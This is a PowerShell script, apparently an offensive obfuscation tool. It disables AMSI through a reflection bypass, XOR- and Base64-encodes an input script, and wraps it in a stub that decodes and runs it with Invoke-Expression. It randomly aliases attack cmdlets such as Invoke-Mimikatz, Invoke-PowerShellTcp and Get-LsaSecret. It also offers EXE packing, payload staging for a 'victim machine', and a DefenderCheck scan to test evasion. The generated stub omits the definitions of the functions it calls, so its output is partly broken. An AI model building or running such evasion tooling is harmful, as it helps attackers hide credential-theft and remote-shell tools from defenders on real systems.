function Get-RandomAlias {
    param([int]$Length = 4)
    -join ((65..90) + (97..122) | Get-Random -Count $Length | ForEach-Object {[char]$_})
}

function Invoke-AMSIBypass {
    $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $Field = $Ref.GetField('amsiInitFailed','NonPublic,Static')
    $Field.SetValue($null,$true)
}

function Encode-Payload {
    param($PayloadString)
    $xorKey = 0x23
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($PayloadString)
    $xorBytes = $bytes | ForEach-Object { $_ -bxor $xorKey }
    $b64 = [Convert]::ToBase64String($xorBytes)
    return $b64
}

function Decode-And-Execute {
    param($Base64String)
    $xorKey = 0x23
    $bytes = [Convert]::FromBase64String($Base64String)
    $decoded = $bytes | ForEach-Object { $_ -bxor $xorKey }
    $script = [System.Text.Encoding]::Unicode.GetString($decoded)
    Invoke-Expression $script
}

$FunctionMap = @{
    'Get-ADUser' = 'ADU'; 'Get-ADGroup' = 'ADG'; 'Get-ADComputer' = 'ADC'; 'Get-ADDomain' = 'ADD'
    'Get-ADForest' = 'ADF'; 'Get-Content' = 'GC'; 'Set-Content' = 'SC'; 'Get-Process' = 'GPrc'
    'Start-Process' = 'SPrc'; 'Invoke-Command' = 'ICmd'; 'Invoke-Mimikatz' = 'IMz'; 'Invoke-PowerShellTcp' = 'PTcp'
    'Invoke-PowerShellTcpEx' = 'PTcpX'; 'Invoke-ServiceAbuse' = 'SvcAbu'; 'Get-NetSession' = 'NetSes'
    'Get-NetLoggedon' = 'NetLog'; 'Find-LocalAdminAccess' = 'FLAA'; 'Find-PRemotingLocalAdminAccess' = 'FPRLAA'
    'Get-SQLServerInfo' = 'SQLI'; 'Get-SQLConnectionTest' = 'SQLT'; 'Get-ServiceUnquoted' = 'SvcUQ'
    'Get-ModifiableService' = 'ModSvc'; 'Invoke-ServiceInstall' = 'SvcInst'; 'Get-RegAlwaysInstallElevated' = 'RegElev'
    'Get-UnattendedInstallFiles' = 'Unattnd'; 'Get-WebConfig' = 'WebCfg'; 'Get-SiteListPassword' = 'SLPwd'
    'Get-LsaSecret' = 'LsaSec'; 'Get-CacheCredentials' = 'CacheCred'; 'Invoke-SessionHunter' = 'SessHunt'
    'Get-Proxy' = 'GProxy'; 'Get-EventLog' = 'EvtLog'; 'Get-WmiObject' = 'WMIObj'; 'Set-ExecutionPolicy' = 'SEPol'
    'Get-ExecutionPolicy' = 'GEPol'
}

$inputScript = Read-Host "Enter the path to the PowerShell script to obfuscate"
$outputName = Read-Host "Enter the name to save the obfuscated script as (e.g., obf_script.ps1)"

if (!(Test-Path $inputScript)) {
    Write-Error "[!] Input script not found. Exiting."
    exit
}

$aliasLog = @{}
$aliasLines = @()
$cleanLines = Get-Content $inputScript | Where-Object { $_ -notmatch '^\s*#' -and $_ -ne '' }

$obfuscatedLines = foreach ($line in $cleanLines) {
    foreach ($func in $FunctionMap.Keys) {
        if ($line -match [regex]::Escape($func)) {
            if (-not $aliasLog.ContainsKey($func)) {
                $suffix = Get-RandomAlias
                $aliasName = "$($FunctionMap[$func])$suffix"
                $aliasLog[$func] = $aliasName
                $aliasLines += "# $func -> $aliasName"
                $aliasLines += "Set-Alias $aliasName $func"
            } else {
                $aliasName = $aliasLog[$func]
            }
            $parts = $func -split '-'
            $concat = '"' + $parts[0] + '" + "-" + "' + $parts[1] + '"'
            $line = $line -replace [regex]::Escape($func), "(`$$aliasName = $concat; &`$$aliasName)"
        }
    }
    $line
}

$joinedScript = ($obfuscatedLines -join "`n")
$encoded = Encode-Payload -PayloadString $joinedScript

$stub = @"
Invoke-AMSIBypass
Decode-And-Execute -Base64String '$encoded'
"@

Set-Content -Path $outputName -Value $stub
Write-Output "[+] Obfuscated + Encoded script with AMSI bypass saved as: $outputName"

$aliasPath = ($outputName -replace '\.ps1$', '') + '_aliases.txt'
$aliasLines | Set-Content -Path $aliasPath
Write-Output "[+] Alias log with usage instructions saved to: $aliasPath"

$peOption = Read-Host "Would you like to pack this into a PE loader (EXE)? y/n"
if ($peOption -eq 'y') {
    if (Test-Path .\PS2EXE-GUI\ps2exe.ps1) {
        & powershell -ExecutionPolicy Bypass -File .\PS2EXE-GUI\ps2exe.ps1 -inputFile $outputName -outputFile ($outputName -replace '\.ps1$', '.exe')
        Write-Output "[+] PE file created."
    } else {
        Write-Warning "[!] ps2exe.ps1 not found in ./PS2EXE-GUI folder. Skipping PE packing."
    }
}

$stagerOption = Read-Host "Break payload into multiple staged scripts? y/n"
if ($stagerOption -eq 'y') {
    $stageSize = 3000
    $encodedChunks = ($encoded -split "(?<=\G.{$stageSize})")
    for ($i = 0; $i -lt $encodedChunks.Count; $i++) {
        $chunkFile = $outputName -replace '\.ps1$', "_stage$i.ps1"
        Set-Content $chunkFile "`$stage$i = '$($encodedChunks[$i])'"
        Write-Output "[+] Stage $i saved: $chunkFile"
    }
    Write-Output "[!] Manual recombination needed in loader or on victim machine."
}

$scan = Read-Host "Do you want to scan the script with DefenderCheck.exe? (y/n)"
if ($scan -eq 'y') {
    if (Test-Path "DefenderCheck.exe") {
        Start-Process .\DefenderCheck.exe -ArgumentList $outputName -Wait
    } else {
        Write-Warning "[!] DefenderCheck.exe not found in current directory. Skipping scan."
    }
}
